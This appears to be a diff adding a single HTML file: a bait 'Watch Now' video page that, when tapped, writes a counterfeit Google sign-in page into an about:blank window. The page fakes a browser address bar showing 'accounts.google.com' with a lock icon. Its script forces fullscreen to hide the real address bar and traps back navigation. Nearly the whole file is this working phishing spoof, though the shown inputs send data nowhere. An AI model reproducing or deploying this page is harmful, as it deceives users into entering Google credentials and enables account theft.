@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Watch: Exclusive Behind-the-Scenes</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-user-select: none; -webkit-touch-callout: none; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #fff;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 24px;
+}
+.bait-card {
+  max-width: 340px;
+  text-align: center;
+}
+.bait-card .thumb {
+  width: 100%;
+  aspect-ratio: 16/9;
+  background: linear-gradient(135deg, #1a1a2e, #16213e);
+  border-radius: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 16px;
+  position: relative;
+  overflow: hidden;
+}
+.bait-card .thumb::after {
+  content: '';
+  position: absolute;
+  width: 60px; height: 60px;
+  background: rgba(255,255,255,0.9);
+  border-radius: 50%;
+}
+.bait-card .thumb::before {
+  content: '';
+  position: absolute;
+  width: 0; height: 0;
+  border-left: 22px solid #1a1a2e;
+  border-top: 13px solid transparent;
+  border-bottom: 13px solid transparent;
+  z-index: 1;
+  margin-left: 4px;
+}
+.bait-card h2 { font-size: 18px; color: #1d1d1f; margin-bottom: 6px; }
+.bait-card p { font-size: 13px; color: #86868b; margin-bottom: 20px; }
+.bait-card button {
+  background: #007aff;
+  color: white;
+  border: none;
+  padding: 14px 0;
+  border-radius: 12px;
+  font-size: 17px;
+  font-weight: 600;
+  width: 100%;
+  cursor: pointer;
+  -webkit-tap-highlight-color: transparent;
+}
+.bait-card button:active { opacity: 0.85; }
+</style>
+</head>
+<body>
+
+<div class="bait-card">
+  <div class="thumb"></div>
+  <h2>Exclusive Interview</h2>
+  <p>Tap to watch the full video</p>
+  <button id="trigger">▶&nbsp; Watch Now</button>
+</div>
+
+<script>
+document.getElementById('trigger').addEventListener('click', function() {
+  // Step 1: Open about:blank window
+  var w = window.open('about:blank');
+  if (!w) {
+    // Fallback if popup blocked: try in-page
+    launchInPage();
+    return;
+  }
+
+  // Step 2: Write full spoof page into about:blank
+  w.document.open();
+  w.document.write(buildSpoofPage());
+  w.document.close();
+});
+
+function launchInPage() {
+  // Fallback: if popup is blocked, do it in current page
+  document.open();
+  document.write(buildSpoofPage());
+  document.close();
+}
+
+function buildSpoofPage() {
+  return '<!DOCTYPE html>' +
+  '<html>' +
+  '<head>' +
+  '<meta charset="utf-8">' +
+  '<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">' +
+  '<title>Google</title>' +
+  '<style>' +
+  '* { margin:0; padding:0; box-sizing:border-box; -webkit-user-select:none; -webkit-touch-callout:none; }' +
+  'html, body { width:100%; height:100%; overflow:hidden; font-family:-apple-system,BlinkMacSystemFont,sans-serif; background:#fff; }' +
+
+  /* Spoof overlay - entire screen */
+  '#spoof {' +
+  '  position:fixed; top:0; left:0; width:100vw; height:100vh;' +
+  '  display:flex; flex-direction:column; z-index:999999; background:#fff;' +
+  '}' +
+
+  /* Status bar */
+  '.s-bar {' +
+  '  height:env(safe-area-inset-top,54px); min-height:48px; background:#fff;' +
+  '  display:flex; align-items:flex-end; justify-content:space-between;' +
+  '  padding:0 24px 6px; font-size:15px; font-weight:600; color:#000; flex-shrink:0;' +
+  '}' +
+
+  /* Top URL bar (for fullscreen mode) */
+  '.t-bar {' +
+  '  height:38px; background:#f2f2f7; margin:4px 16px 0; border-radius:10px;' +
+  '  display:flex; align-items:center; padding:0 14px; font-size:14px;' +
+  '  color:#1d1d1f; flex-shrink:0;' +
+  '}' +
+
+  /* Content */
+  '.content {' +
+  '  flex:1; overflow-y:auto; -webkit-overflow-scrolling:touch; background:#fff;' +
+  '}' +
+
+  /* Bottom bar (Arc iOS style) */
+  '.b-bar {' +
+  '  flex-shrink:0; background:#f9f9f9; border-top:0.5px solid #d1d1d6;' +
+  '  padding:8px 16px; padding-bottom:calc(8px + env(safe-area-inset-bottom,0px));' +
+  '}' +
+  '.b-url {' +
+  '  height:36px; background:#e8e8ed; border-radius:10px;' +
+  '  display:flex; align-items:center; justify-content:center;' +
+  '  font-size:14px; color:#1d1d1f; gap:6px;' +
+  '}' +
+  '.b-nav {' +
+  '  display:flex; justify-content:space-around; align-items:center; padding:10px 0 2px;' +
+  '}' +
+  '.b-nav span { font-size:20px; color:#8e8e93; padding:4px 12px; }' +
+
+  /* Lock SVG */
+  '.lk { display:inline-flex; align-items:center; }' +
+  '.lk svg { width:10px; height:12px; }' +
+
+  /* Inputs */
+  '.gi { width:100%; padding:14px 16px; border:1px solid #dadce0; border-radius:4px;' +
+  '  font-size:16px; outline:none; -webkit-appearance:none; background:#fff; margin-bottom:12px; }' +
+  '.gi:focus { border-color:#1a73e8; border-width:2px; }' +
+  '</style>' +
+  '</head>' +
+  '<body>' +
+
+  '<div id="spoof">' +
+
+  /* Status bar */
+  '<div class="s-bar"><span>9:41</span><span style="font-size:13px;">5G&nbsp;&nbsp;\ud83d\udd0b</span></div>' +
+
+  /* Top bar */
+  '<div class="t-bar">' +
+  '<span class="lk"><svg viewBox="0 0 24 24" fill="none" stroke="#34c759" stroke-width="3"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></span>' +
+  '&nbsp;&nbsp;accounts.google.com' +
+  '</div>' +
+
+  /* Content */
+  '<div class="content">' +
+  '<div style="max-width:360px;margin:36px auto;padding:20px;text-align:center;">' +
+
+  /* Google logo */
+  '<svg viewBox="0 0 272 92" width="120" style="margin-bottom:12px;">' +
+  '<text x="0" y="70" font-family="-apple-system,sans-serif" font-size="80" font-weight="500">' +
+  '<tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc05">o</tspan>' +
+  '<tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>' +
+  '</text></svg>' +
+
+  '<h1 style="font-size:22px;font-weight:400;color:#202124;margin-bottom:4px;">Sign in</h1>' +
+  '<p style="font-size:15px;color:#202124;margin-bottom:28px;">to continue to your account</p>' +
+
+  '<input class="gi" type="email" placeholder="Email or phone" autocomplete="off">' +
+  '<input class="gi" type="password" placeholder="Enter your password" autocomplete="off">' +
+
+  '<div style="text-align:left;margin-bottom:28px;">' +
+  '<a style="color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500;">Forgot email?</a>' +
+  '</div>' +
+
+  '<p style="font-size:13px;color:#5f6368;text-align:left;margin-bottom:28px;line-height:1.5;">' +
+  'Not your device? Use Guest mode to sign in privately. ' +
+  '<a style="color:#1a73e8;text-decoration:none;font-weight:500;">Learn more about using Guest mode</a></p>' +
+
+  '<div style="display:flex;justify-content:space-between;align-items:center;">' +
+  '<a style="color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500;">Create account</a>' +
+  '<button style="background:#1a73e8;color:white;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;">Next</button>' +
+  '</div>' +
+
+  '</div>' +
+  '</div>' +
+
+  /* Bottom bar */
+  '<div class="b-bar">' +
+  '<div class="b-url">' +
+  '<span class="lk"><svg viewBox="0 0 24 24" fill="none" stroke="#34c759" stroke-width="3"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></span>' +
+  'accounts.google.com' +
+  '</div>' +
+  '<div class="b-nav">' +
+  '<span>&#x25C0;</span><span>&#x25B6;</span><span style="font-size:24px;">&#x2295;</span><span>&#x2750;</span><span>&#x2630;</span>' +
+  '</div>' +
+  '</div>' +
+
+  '</div>' +
+
+  '<script>' +
+  /* Try fullscreen to hide real address bar */
+  'setTimeout(function(){' +
+  '  try{' +
+  '    var d=document.documentElement;' +
+  '    if(d.requestFullscreen)d.requestFullscreen();' +
+  '    else if(d.webkitRequestFullscreen)d.webkitRequestFullscreen();' +
+  '  }catch(e){}' +
+  '},300);' +
+
+  /* Prevent back navigation */
+  'history.pushState(null,"",window.location.href);' +
+  'window.addEventListener("popstate",function(){history.pushState(null,"",window.location.href);});' +
+
+  /* Prevent pull-to-refresh */
+  'document.body.addEventListener("touchmove",function(e){' +
+  '  var c=document.querySelector(".content");' +
+  '  if(c&&c.scrollTop<=0)e.preventDefault();' +
+  '},{passive:false});' +
+
+  '<\/script>' +
+  '</body></html>';
+}
+</script>
+
+</body>
+</html>
